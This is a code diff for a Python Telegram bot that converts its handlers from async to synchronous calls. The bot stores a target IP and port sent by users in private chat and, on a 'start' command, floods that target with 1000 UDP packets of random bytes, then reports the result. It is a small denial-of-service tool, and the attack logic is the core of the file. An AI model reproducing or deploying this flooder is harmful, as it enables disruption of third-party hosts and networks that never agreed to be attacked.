@@ -27,14 +27,14 @@ def infoBox(msg):
 def errorBox(msg):
     return "{}[{}{}{}] [{}{}{}] {}".format(f.RESET, f.RED, "ERROR", f.RESET, f.YELLOW, time.strftime("%H:%%M:%S"), f.RESET, msg)
 
-async def start(ip, port, for_):
+def start(ip, port, for_):
     num = 0
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 #        num += 1
 
         for i in range(for_):
-            await sock.sendto(randomBytes(), (ip, port))
+            sock.sendto(randomBytes(), (ip, port))
             num += 1
     except Exception as e:
         return e
@@ -51,7 +51,7 @@ data : dict = {}
 @app.message_handler(content_types=["text"], chat_types=["private"])
 
 
-async def main(msg):
+def main(msg):
 
     text = str(msg.text)
 
@@ -62,17 +62,17 @@ async def main(msg):
         ip_code = uid()
         data["ip{}".format(ip_code)] = ip
 
-        await app.reply(msg, f"ip code : {ip_code}")
+        app.reply(msg, f"ip code : {ip_code}")
 
     if text.startswith("/set_port"):
         port = int(text.replace("/set_port ", ""))
         port_code = uid()
         data["port{}".format(port_code)] = port
 
-        await app.reply(msg, f"port code: {port_code}")
+        app.reply(msg, f"port code: {port_code}")
 
     if text.startswith("start"):
-        await app.reply(msg, "get data ...")
+        app.reply(msg, "get data ...")
         more = text.replace("start ", "")
 
         ipportCode = [str(z) for z in more.split(":")]
@@ -98,9 +98,9 @@ async def main(msg):
                     global portMain
                     portMain = p
 
-        await  app.reply(msg, "process ...")
+        app.reply(msg, "process ...")
         res = start(ipMain, portMain, 1000)
-        await app.reply(msg, "sended => {}".format(res))
+        app.reply(msg, "sended => {}".format(res))
 
   #  if text.startswith("/stop"):
  #       codeToStop = text.replace("/stop ", "")
@@ -115,6 +115,6 @@ async def main(msg):
 
 
     
-asyncio.run(app.infinity_polling())
+app.infinity_polling()
 
 
